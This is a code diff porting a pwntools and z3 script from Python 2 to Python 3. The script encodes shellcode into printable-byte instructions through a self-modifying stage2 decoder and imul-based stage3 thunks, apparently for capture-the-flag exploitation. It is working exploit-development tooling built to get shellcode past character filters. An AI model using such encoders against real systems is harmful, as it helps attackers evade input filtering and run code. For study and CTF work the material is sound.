@@ -1,6 +1,7 @@
 from pwn import *
 from z3 import *
 import operator
+from functools import reduce
 
 context.arch = 'amd64'
 context.bits = 64
@@ -15,7 +16,7 @@ def is_ok16(i16):
     return reduce(operator.and_, is_ok_str(p16(i16)))
 
 def is_ok_str(s):
-    return map(is_ok, map(ord, s))
+    return list(map(is_ok, list(s)))
 
 def check(shellcode):
     for b in shellcode:
@@ -41,7 +42,7 @@ def solve_add_eax(i32,bits=32):
                 s.add(ULT(Extract(k+7, k, var), BitVecVal(0x7f, 8)))
         if str(s.check()) == 'sat':
             m = s.model()
-            return map(int, map(str, map(m.evaluate, variables)))
+            return list(map(int, list(map(str, list(map(m.evaluate, variables))))))
     else:
         raise ValueError("couldn't solve eax+=%08x" %(i32,))
 
@@ -62,7 +63,7 @@ def solve_set_eax(i32, bits=32):
                 s.add(ULT(Extract(k+7, k, var), BitVecVal(0x7f, 8)))
         if str(s.check()) == 'sat':
             m = s.model()
-            return map(int, map(str, map(m.evaluate, variables)))
+            return list(map(int, list(map(str, list(map(m.evaluate, variables))))))
     else:
         raise ValueError("couldn't solve eax=%08x" %(i32,))
 
@@ -83,7 +84,7 @@ def solve_set_rax_imul(i64, max_difficulty=1): # requires access to imul
                 s.add(ULT(Extract(k+7, k, var), BitVecVal(0x7f, 8)))
         if str(s.check()) == 'sat':
             m = s.model()
-            return map(int, map(str, map(m.evaluate, variables)))
+            return list(map(int, list(map(str, list(map(m.evaluate, variables))))))
     else:
         raise ValueError("couldn't solve rax=%016x" %(i64,))
 
@@ -128,7 +129,7 @@ def set_rax(i64):
     for i in range(0, 4):
         words.insert(0, i64 & 0xffff)
         i64 >>= 16
-    shellcode = ''
+    shellcode = b''
     for i16 in words:
         shellcode += set_ax(i16)
         shellcode += asm('push ax')
@@ -162,7 +163,7 @@ add_rdi_4 = add_rdi(4)
 # writes arbitrary 4 bytes at [rdx+offset], rcx, rax, rsi clobbered
 # rdi incremented by 4
 def write4(i32):
-    shellcode = ''
+    shellcode = b''
 
     # zero 4 bytes at rdx+rdi
     shellcode += asm('''
@@ -185,41 +186,41 @@ xor [rdx+rdi], esi
 
 def xlate(stage2, stage3):
     # rdx = ptr to shellcode DON'T CLOBBER ME, i know where you live
-    payload = ''
+    payload = b''
 
     payload += zero_rax() # zero rsi and rax, clobber r8 and r9
     payload += asm('push rax; push rax; pop rbx; pop rdi;') # save zero in rbx for later uses
 
-    print 'Encoding stage2'
+    print('Encoding stage2')
     for i in range(0, len(stage2), 4):
         frag = stage2[i:i+4]
         xlate_frag = write4(u32(frag))
         payload += xlate_frag
-        print '%s => %s' % (frag.encode('hex'), xlate_frag.encode('hex'))
+        print('%s => %s' % (frag.hex(), xlate_frag.hex()))
 
-    print 'Multiply-encoding stage3'
-    stage3_thunk = ''
+    print('Multiply-encoding stage3')
+    stage3_thunk = b''
     for i in range(0, len(stage3), 8):
         frag = stage3[i:i+8]
-        xlate_frags = map(p64, solve_set_rax_imul(u64(frag)))
-        print '%s =>' % (frag.encode('hex'),),
+        xlate_frags = list(map(p64, solve_set_rax_imul(u64(frag))))
+        print('%s =>' % (frag.hex(),), end=' ')
         for xlate_frag in xlate_frags:
             stage3_thunk += xlate_frag
-            print xlate_frag.encode('hex'),
-        print
+            print(xlate_frag.hex(), end=' ')
+        print()
 
     len_set_rdi = len(set_rdi(0xdeadbeef))
     len_write4 = len(write4(0xdeadbeef))
 
     # assemble args for and jump to stage2
     offset_of_jump = len(payload) + len_set_rdi + len_write4 + 2 * len_set_rdi
-    print "Assembling jump at +%d" % (offset_of_jump,)
+    print("Assembling jump at +%d" % (offset_of_jump,))
     payload += set_rdi(offset_of_jump) # point to jmp instruction location
     payload += write4(u32(asm('jmp rdx; nop; nop;')))
 
     payload += set_rsi(offset_of_jump + 4) # point to stage3 thunk
     payload += set_rdi(len(stage2)) # point to after stage2
-    payload += 'AAAA' # gets overwritten by jmp
+    payload += b'AAAA' # gets overwritten by jmp
     payload += stage3_thunk
 
     return payload
@@ -234,10 +235,10 @@ add esi, 16
 test eax,eax
 jnz loop
 ''')
-stage2 += '\x90' * (-len(stage2) % 4) # pad
+stage2 += b'\x90' * (-len(stage2) % 4) # pad
 
 def encode(stage3):
-    stage3 += '\x90' * (-len(stage3) % 8) # pad
+    stage3 += b'\x90' * (-len(stage3) % 8) # pad
 
     payload = xlate(stage2, stage3)
 
